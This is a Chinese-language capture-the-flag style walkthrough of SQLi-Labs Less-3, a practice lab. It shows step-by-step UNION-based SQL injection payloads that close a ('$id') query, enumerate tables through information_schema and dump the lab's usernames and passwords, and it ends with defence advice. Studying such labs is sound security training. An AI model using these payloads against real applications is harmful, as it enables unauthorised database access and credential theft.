## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：发现单引号和括号的闭合方式，利用 UNION 联合查询出所有账号密码。

## 二、大白话原理讲解
前两关，柜员（数据库）要么认单引号，要么只认数字。
这一关，柜员突然“变异”了。他不仅要求你输入的内容被单引号包着，**外面还多套了一层括号**。

如果你还像第一关那样，只递给他一个单引号（`'`），他虽然会脑子短路报错，但报错信息里会漏出马脚（多了一个 `)`）。
这就好比你知道他保险柜的门不仅需要钥匙（单引号），外面还有一个插销（括号）。你只要在输入的时候，把单引号和右括号一起给他（`')`），这道门就被你彻底打开了。接下来的套路，依然是拿东西走人。

## 三、解题步骤

**1. 测试注入点并观察报错**
输入 `?id=1'`，页面报错：
`You have an error in your SQL syntax; ... right syntax to use near ''1'') LIMIT 0,1' at line 1`
**分析**：仔细观察报错信息，`near` 后面是 `'1'')`。这比第一关多了一个右括号 `)`。说明后台 SQL 语句大概是 `SELECT * FROM users WHERE id = ('$id') LIMIT 0,1`。我们需要用 `')` 来闭合它，并用 `--+` 注释掉后面的内容。

**2. 确认列数（ORDER BY）**
用正确的闭合符测试列数：
```sql
?id=1') order by 1 --+
?id=1') order by 2 --+
?id=1') order by 3 --+
?id=1') order by 4 --+  (报错：Unknown column '4' in 'order clause')
```
**结论**：原查询结果共有 3 列。

**3. 寻找回显点（UNION SELECT）**
构造 `-1')` 让原查询失效，并联合查询：
```sql
?id=-1') union select 1,2,3 --+
```
**结论**：页面回显了 `2` 和 `3`，说明第 2 和第 3 列是回显点。

**4. 爆库、爆表、爆数据**
利用回显点，直接拖库：

*   **查当前数据库名**：
```sql
?id=-1') union select 1,database(),3 --+
```
（回显库名为 `security`）

*   **查数据库下的表名**：
```sql
?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```
（查出有 `users` 等表）

*   **查 `users` 表的字段名**：
```sql
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```
（查出有 `username`, `password` 等字段）

*   **最终爆出账号密码**：
```sql
?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+
```
*(注：`0x3a` 是冒号的十六进制)*

**5. 验证结果**
提交后，页面成功回显出所有账号密码，例如：
```text
Your Login name: Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:...
```
成功通关。

## 四、知识点解析
1. **带括号的注入**：后台可能使用了 `id = ('$id')` 这种格式。测试时，如果发现单引号报错里带右括号，就需要组合闭合，如 `')`。
2. **闭合与注释**：闭合符号（如 `')`）后面一定要跟 `--+` 或 `#`，将后方原本存在的右括号和 LIMIT 语句注释掉，使其语法完整。
3. **UNION SELECT 的通用性**：无论闭合方式怎么变，只要页面有回显，UNION 联合查询永远是最高效的“爆数据”手段。

## 五、总结与防御
**本题总结**：
遇到加括号的变形注入，不要慌，通过看报错信息，找到缺失的那个闭合字符（比如 `')`），然后用正确的组合将其闭合掉即可。

**安全防御建议**：
- **强制类型转换**：对于数字型参数（如本关本应是数字但被加上了括号和引号），服务端强制使用 `intval()`，可以直接防住。
- **预编译语句（PDO/MySQLi）**：最根本的防御手段，彻底杜绝注入漏洞。
